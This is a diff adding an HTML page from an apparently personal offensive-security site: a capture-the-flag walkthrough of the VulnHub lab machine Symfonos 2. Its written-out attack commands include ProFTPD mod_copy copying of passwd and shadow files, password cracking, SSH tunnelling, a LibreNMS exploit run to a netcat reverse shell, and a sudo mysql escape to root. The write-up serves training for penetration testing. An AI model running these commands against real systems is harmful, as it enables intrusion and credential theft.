@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;800&family=Rajdhani:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../styles.css">
+    <title>Symfonos 2 | Walkthrough</title>
+</head>
+<body>
+
+<nav class="navbar">
+    <a class="logo" href="../index.html">ROOT ACCESS</a>
+    <ul class="nav-links">
+        <li><a href="../index.html">Home</a></li>
+        <li><a href="../index.html#about">About</a></li>
+        <li><a href="../index.html#resume">Resume</a></li>
+        <li><a href="../index.html#projects">Projects</a></li>
+        <li><a href="../walkthroughs.html">Walkthroughs</a></li>
+    </ul>
+</nav>
+
+<main class="writeup-container">
+    <!-- HERO SECTION -->
+    <div class="writeup-hero">
+        <span class="difficulty-badge">MEDIUM</span>
+        <h1>Symfonos: 2</h1>
+        <p class="machine-meta">Linux VM · VulnHub · ProFTPD mod_copy · SMB Leaks · LibreNMS RCE · MySQL PrivEsc</p>
+        <div class="attack-summary">
+            <p>This box is an OSCP-style grind. Anonymous SMB share, ProFTPD mod_copy vulnerability, credential reuse, SSH tunneling, LibreNMS authenticated RCE, and a stupid-simple MySQL escape to root. Let's break it down.</p>
+        </div>
+    </div>
+
+    <!-- EXECUTIVE ABSTRACT - Your Voice -->
+    <div class="executive-abstract">
+        <h2>🎯 The Short Version (For Busy People)</h2>
+        <p><strong>What happened:</strong> Anonymous SMB share leaked info about FTP backups. ProFTPD 1.3.5 had the mod_copy vuln, letting me copy <code>/etc/passwd</code> and <code>/var/backups/shadow.bak</code> into the SMB share. Grabbed those, cracked <code>aeolus:sergioteamo</code>, SSH'd in. Found LibreNMS on localhost:8080, tunneled to it, reused creds. Exploited CVE-2018-20434 for RCE, got shell as <code>cronus</code>. Then <code>sudo mysql</code> + <code>\! /bin/bash</code> = root. Done.</p>
+        <p><strong>Time to root:</strong> ~75 minutes. <strong>Biggest lesson:</strong> Never assume localhost services are safe. SSH tunneling exposes everything.</p>
+    </div>
+
+    <!-- VISUAL TIMELINE -->
+    <div class="timeline">
+        <div class="step">1. Recon</div>
+        <div class="step">2. SMB/FTP</div>
+        <div class="step">3. Tunnel</div>
+        <div class="step">4. Root</div>
+    </div>
+
+    <!-- PHASE 1: RECON -->
+    <section class="phase">
+        <h2>🔍 Phase 1: Reconnaissance</h2>
+        <p>Started with a fast port scan to see what's open:</p>
+        <pre><code>sudo nmap -p- --min-rate 1000 -T4 -oA ~/Documents/Coding/Symf2/nmap/allports 192.168.56.109</code></pre>
+        <p>Then a full service scan on discovered ports:</p>
+        <pre><code>sudo nmap -sC -sV -p- -oN ~/Documents/Coding/Symf2/nmap/fullscan.nmap 192.168.56.109</code></pre>
+        <p>Results showed ports 21 (FTP - ProFTPD 1.3.5), 22 (SSH), 80 (HTTP), 139/445 (SMB). Nothing crazy yet.</p>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos2/nmap-scan1.png" alt="Nmap scan results">
+            <p>Figure 1: Nmap showing open ports.</p>
+        </div>
+    </section>
+
+    <!-- PHASE 2: SMB & FTP ENUM -->
+    <section class="phase">
+        <h2>📁 Phase 2: SMB & FTP Enumeration</h2>
+        
+        <h3>SMB - The First Break</h3>
+        <p>Checked SMB shares anonymously:</p>
+        <pre><code>smbclient -L //192.168.56.109 -N</code></pre>
+        <p>Found an <code>anonymous</code> share with READ/WRITE access. Mapped to <code>/home/aeolus/share</code>. That's interesting - a user's home directory exposed.</p>
+        
+        <div class="ima`ge-card">
+            <img src="../Imgs/symfonos2/smb-anonymous.png" alt="SMB anonymous share listing">
+            <p>Figure 2: Anonymous SMB share discovered.</p>
+        </div>
+
+        <p>Connected and found a <code>backups/</code> folder with <code>log.txt</code>. Downloaded it. The log referenced <code>/var/backups/shadow.bak</code> and ProFTPD configs. Not credentials yet, but breadcrumbs.</p>
+
+        <h3>FTP - ProFTPD 1.3.5</h3>
+        <p>Checked FTP:</p>
+        <pre><code>ftp 192.168.56.109
+220 ProFTPD 1.3.5 Server</code></pre>
+        <p>Anonymous login? Nope. <code>530 Login incorrect.</code> But that version... quick research: ProFTPD 1.3.5 has the <strong>mod_copy</strong> vulnerability. Lets you copy files on the server without auth using <code>SITE CPFR</code> and <code>SITE CPTO</code>.</p>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos2/ftp-banner.png" alt="FTP banner showing ProFTPD 1.3.5">
+            <p>Figure 3: ProFTPD 1.3.5 - vulnerable to mod_copy.</p>
+        </div>
+
+        <h3>Abusing mod_copy</h3>
+        <p>Connected via raw FTP and copied sensitive files into the SMB-accessible share:</p>
+        <pre><code>SITE CPFR /etc/passwd
+SITE CPTO /home/aeolus/share/passwd
+
+SITE CPFR /var/backups/shadow.bak
+SITE CPTO /home/aeolus/share/shadow.bak</code></pre>
+        <p>Then grabbed them via SMB:</p>
+        <pre><code>smbclient //192.168.56.109/anonymous -N
+get passwd
+get shadow.bak</code></pre>
+
+        <div class="image-card">
+            <img src="../Imgs/symfonos2/mod_copy.png" alt="ProFTPD mod_copy exploitation">
+            <p>Figure 4: Using SITE CPFR/CPTO to copy shadow.bak.</p>
+        </div>
+
+        <h3>Cracking Hashes</h3>
+        <p>Merged passwd and shadow.bak:</p>
+        <pre><code>unshadow passwd shadow.bak > hashes.txt</code></pre>
+        <p>Then John with rockyou:</p>
+        <pre><code>john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+        <p>Got a hit:</p>
+        <pre><code>sergioteamo      (aeolus)</code></pre>
+        <p>Now we have SSH creds: <code>aeolus:sergioteamo</code>.</p>
+
+        <div class="image-card">
+            <img src="../Imgs/symfonos2/john-crack.png" alt="John the Ripper cracking hash">
+            <p>Figure 5: Successfully cracked aeolus password.</p>
+        </div>
+    </section>
+
+    <!-- PHASE 3: SSH & TUNNELING -->
+    <section class="phase">
+        <h2>🔐 Phase 3: SSH Access & Port Forwarding</h2>
+        
+        <p>SSH in as aeolus:</p>
+        <pre><code>ssh aeolus@192.168.56.109</code></pre>
+        <p>Now inside. Time to enumerate internally. Used <code>ss -tulpn</code> to find services bound to localhost:</p>
+        <pre><code>ss -tulpn</code></pre>
+        <p>Found something on <code>127.0.0.1:8080</code>. That's an internal web app we can't reach from outside. Time to tunnel.</p>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos2/ss-tulpn.png" alt="ss -tulpn showing localhost:8080">
+            <p>Figure 6: Internal service discovered on localhost:8080.</p>
+        </div>
+
+        <h3>SSH Local Port Forwarding</h3>
+        <p>From attacker machine:</p>
+        <pre><code>ssh -L 8080:127.0.0.1:8080 aeolus@192.168.56.109</code></pre>
+        <p>Now <code>http://127.0.0.1:8080</code> on MY machine points to THEIR internal service. Browsed to it...</p>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos2/ssh-tunnel.png" alt="SSH tunnel command">
+            <p>Figure 7: Creating SSH tunnel to internal service.</p>
+        </div>
+
+        <h3>LibreNMS Discovered</h3>
+        <p>It's a <strong>LibreNMS</strong> login page. Tried the cracked credentials: <code>aeolus:sergioteamo</code>. Logged right in. Credential reuse for the win.</p>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos2/librenms-login.png" alt="LibreNMS login page">
+            <p>Figure 8: LibreNMS dashboard - authenticated.</p>
+        </div>
+    </section>
+
+    <!-- PHASE 4: RCE -->
+    <section class="phase">
+        <h2>💥 Phase 4: LibreNMS Authenticated RCE</h2>
+        
+        <p>Searched for exploits:</p>
+        <pre><code>searchsploit librenms</code></pre>
+        <p>Found: <strong>LibreNMS 1.46 - 'addhost' Remote Code Execution (CVE-2018-20434)</strong>. Perfect.</p>
+        
+        <p>The exploit requires valid session cookies. Used Burp Suite to intercept a login request and grabbed:</p>
+        <pre><code>PHPSESSID=1ncdrdf21itrctcphrgo7eb0a1
+librenms_session=eyJpdiI6IlhPSEs0MlFhSkRuaTlrWWNBekdnZ0E9PSIsInZhbHVlIjoidVBTZWlzSlJPZXVzN1J4WWVsQjRpXC9yUFlwNWtFUmRiN1RaQXM2a2JBMXFnTE5NMGRDMHQ3ZGJxXC9zdUtwY3N1T0g4VXJqb0VZZ241XC9sdWQ3RHkrZGc9PSIsIm1hYyI6Ijg3NjFkNWM3YjQ3OGIyNjFmNmIyNDQ2NTA3NjBjNzYwYTBjY2YwM2JkMDhhY2NjZDJjMTQ2MTk3NjI2MDczMTEifQ</code></pre>
+
+        <div class="image-card">
+            <img src="../Imgs/symfonos2/burp-cookies.png" alt="Burp Suite session cookie extraction">
+            <p>Figure 9: Extracting session cookies with Burp.</p>
+        </div>
+
+        <h3>Reverse Shell</h3>
+        <p>Set up listener:</p>
+        <pre><code>nc -lvnp 4444</code></pre>
+        <p>Ran the exploit. Important note: the callback IP must be reachable by the victim. Checked <code>ip a</code> - my VirtualBox host-only adapter was <code>192.168.56.1</code>. That's the one.</p>
+        <pre><code>python3 47044.py http://127.0.0.1:8080 "PHPSESSID=...; librenms_session=..." 192.168.56.1 4444</code></pre>
+        <p>Caught the shell:</p>
+        <pre><code>Connection received on 192.168.56.109
+whoami
+cronus</code></pre>
+
+        <div class="image-card">
+            <img src="../Imgs/symfonos2/rce-shell.png" alt="Reverse shell as cronus">
+            <p>Figure 10: Reverse shell obtained as cronus.</p>
+        </div>
+    </section>
+
+    <!-- PHASE 5: PRIVESC -->
+    <section class="phase">
+        <h2>👑 Phase 5: Privilege Escalation to Root</h2>
+        
+        <p>Checked sudo permissions:</p>
+        <pre><code>sudo -l</code></pre>
+        <p>Output:</p>
+        <pre><code>(root) NOPASSWD: /usr/bin/mysql</code></pre>
+        <p>Wait... <code>cronus</code> can run MySQL as root? Without a password? That's the ticket.</p>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos2/sudo-l.png" alt="sudo -l showing mysql NOPASSWD">
+            <p>Figure 11: cronus can run mysql as root.</p>
+        </div>
+
+        <h3>MySQL Shell Escape</h3>
+        <p>Launched MySQL as root:</p>
+        <pre><code>sudo mysql</code></pre>
+        <p>Inside MySQL, escaped to a shell:</p>
+        <pre><code>\! /bin/bash</code></pre>
+        <p>Checked who I am:</p>
+        <pre><code>whoami
+root</code></pre>
+        <p>That's it. Game over.</p>
+
+        <div class="image-card">
+            <img src="../Imgs/symfonos2/mysql-escape.png" alt="MySQL shell escape to root">
+            <p>Figure 12: \! /bin/bash inside mysql = root shell.</p>
+        </div>
+    </section>
+
+    <!-- CONCLUSION -->
+    <section class="phase conclusion">
+        <h2>🏁 The Takeaway</h2>
+        <ul>
+            <li><strong>Anonymous SMB shares are goldmines.</strong> Even without direct creds, they leak paths and usernames.</li>
+            <li><strong>ProFTPD mod_copy is stupidly easy to abuse.</strong> If you see 1.3.5, try SITE CPFR/CPTO immediately.</li>
+            <li><strong>SSH tunneling changes everything.</strong> Localhost services are NEVER safe if you have any foothold.</li>
+            <li><strong>Credential reuse is real.</strong> aeolus:sergioteamo worked everywhere.</li>
+            <li><strong>Always check sudo -l.</strong> <code>sudo mysql</code> + <code>\! /bin/bash</code> is a classic for a reason.</li>
+        </ul>
+        
+        <div class="image-card">
+            <img src="../Imgs/symfonos2/root-proof.png" alt="Root shell confirmation">
+            <p>Figure 13: Root access confirmed. Box done.</p>
+        </div>
+        
+        <a href="../walkthroughs.html" class="btn-back">← Back to Walkthroughs</a>
+    </section>
+</main>
+
+<footer>
+    <p>© 2025 ROOT ACCESS | Built for offensive security professionals</p>
+</footer>
+
+</body>
+</html>
